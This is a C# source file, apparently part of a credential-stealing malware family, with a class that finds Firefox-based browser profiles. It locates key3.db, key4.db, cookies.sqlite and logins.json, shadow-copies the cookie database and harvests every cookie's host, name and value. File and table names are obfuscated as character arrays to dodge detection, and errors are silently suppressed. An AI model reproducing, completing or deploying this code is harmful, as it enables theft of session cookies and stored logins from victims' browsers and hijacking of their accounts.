using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using WindowsSDK.Data.SQLite;
using WindowsSDK.Extensions;
using WindowsSDK.Objects;
using WindowsSDK.Objects.Browsers;

namespace WindowsSDK.Data.Credentials
{
    public static class Gecko
    {
        public static List<ScannedBrowser> Scan(IList<string> paths)
        {
            List<ScannedBrowser> list = new List<ScannedBrowser>();
            try
            {
                foreach (string item in paths.Select((string x) => Environment.ExpandEnvironmentVariables(x)))
                {
                    try
                    {
                        foreach (string item2 in FileCopier.FindPaths(item, 2, 1, new string(new char[7] { 'k', 'e', 'y', '3', '.', 'd', 'b' }), new string(new char[7] { 'k', 'e', 'y', '4', '.', 'd', 'b' }), new string(new char[14]
                        {
                            'c', 'o', 'o', 'k', 'i', 'e', 's', '.', 's', 'q',
                            'l', 'i', 't', 'e'
                        }), new string(new char[11]
                        {
                            'l', 'o', 'g', 'i', 'n', 's', '.', 'j', 's', 'o',
                            'n'
                        })))
                        {
                            string fullName = new FileInfo(item2).Directory.FullName;
                            string text = (item2.Contains(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming")) ? GeckoRoamingName(fullName) : GeckoLocalName(fullName));
                            if (!string.IsNullOrEmpty(text))
                            {
                                ScannedBrowser scannedBrowser = new ScannedBrowser
                                {
                                    BrowserName = text,
                                    BrowserProfile = new DirectoryInfo(fullName).Name,
                                    Cookies = new List<ScannedCookie>(EnumCook(fullName)).IsNull(),
                                    Logins = new List<Account>(),
                                    Autofills = new List<Autofill>(),
                                    CC = new List<CC>()
                                };
                                if (!scannedBrowser.IsEmpty())
                                {
                                    list.Add(scannedBrowser);
                                }
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
            return list;
        }

        private static List<ScannedCookie> EnumCook(string profile)
        {
            List<ScannedCookie> list = new List<ScannedCookie>();
            try
            {
                string text = Path.Combine(profile, new string(new char[14]
                {
                    'c', 'o', 'o', 'k', 'i', 'e', 's', '.', 's', 'q',
                    'l', 'i', 't', 'e'
                }));
                if (!File.Exists(text))
                {
                    return list;
                }
                using FileCopier fileCopier = new FileCopier();
                DataBaseConnection dataBaseConnection = new DataBaseConnection(fileCopier.CreateShadowCopy(text));
                dataBaseConnection.ReadTable(new string(new char[11]
                {
                    'm', 'o', 'z', '_', 'c', 'o', 'o', 'k', 'i', 'e',
                    's'
                }));
                for (int i = 0; i < dataBaseConnection.RowLength; i++)
                {
                    ScannedCookie scannedCookie = null;
                    try
                    {
                        ScannedCookie scannedCookie2 = new ScannedCookie
                        {
                            Host = dataBaseConnection.ParseValue(i, new string(new char[4] { 'h', 'o', 's', 't' })).Trim(),
                            Http = dataBaseConnection.ParseValue(i, new string(new char[4] { 'h', 'o', 's', 't' })).Trim().StartsWith("."),
                            Path = dataBaseConnection.ParseValue(i, new string(new char[4] { 'p', 'a', 't', 'h' })).Trim(),
                            Secure = dataBaseConnection.ParseValue(i, new string(new char[8] { 'i', 's', 'S', 'e', 'c', 'u', 'r', 'e' })).StartsWith("1"),
                            Expires = long.Parse(dataBaseConnection.ParseValue(i, new string(new char[6] { 'e', 'x', 'p', 'i', 'r', 'y' })).Trim()),
                            Name = dataBaseConnection.ParseValue(i, new string(new char[4] { 'n', 'a', 'm', 'e' })).Trim(),
                            Value = dataBaseConnection.ParseValue(i, new string(new char[5] { 'v', 'a', 'l', 'u', 'e' }))
                        };
                        scannedCookie = scannedCookie2;
                    }
                    catch
                    {
                    }
                    if (scannedCookie != null)
                    {
                        list.Add(scannedCookie);
                    }
                }
            }
            catch
            {
            }
            return list;
        }

        public static string GeckoRoamingName(string profilesDirectory)
        {
            string result = string.Empty;
            try
            {
                profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[10] { '%', 'a', 'p', 'p', 'd', 'a', 't', 'a', '%', '\\' })), string.Empty);
                string[] array = profilesDirectory.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                result = ((!(array[2] == new string(new char[8] { 'P', 'r', 'o', 'f', 'i', 'l', 'e', 's' }))) ? array[0] : array[1]);
            }
            catch
            {
            }
            return result;
        }

        public static string GeckoLocalName(string profilesDirectory)
        {
            string result = string.Empty;
            try
            {
                profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[15]
                {
                    '%', 'l', 'o', 'c', 'a', 'l', 'a', 'p', 'p', 'd',
                    'a', 't', 'a', '%', '\\'
                })), string.Empty);
                string[] array = profilesDirectory.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                result = ((!(array[2] == new string(new char[8] { 'P', 'r', 'o', 'f', 'i', 'l', 'e', 's' }))) ? array[0] : array[1]);
            }
            catch
            {
            }
            return result;
        }
    }
}
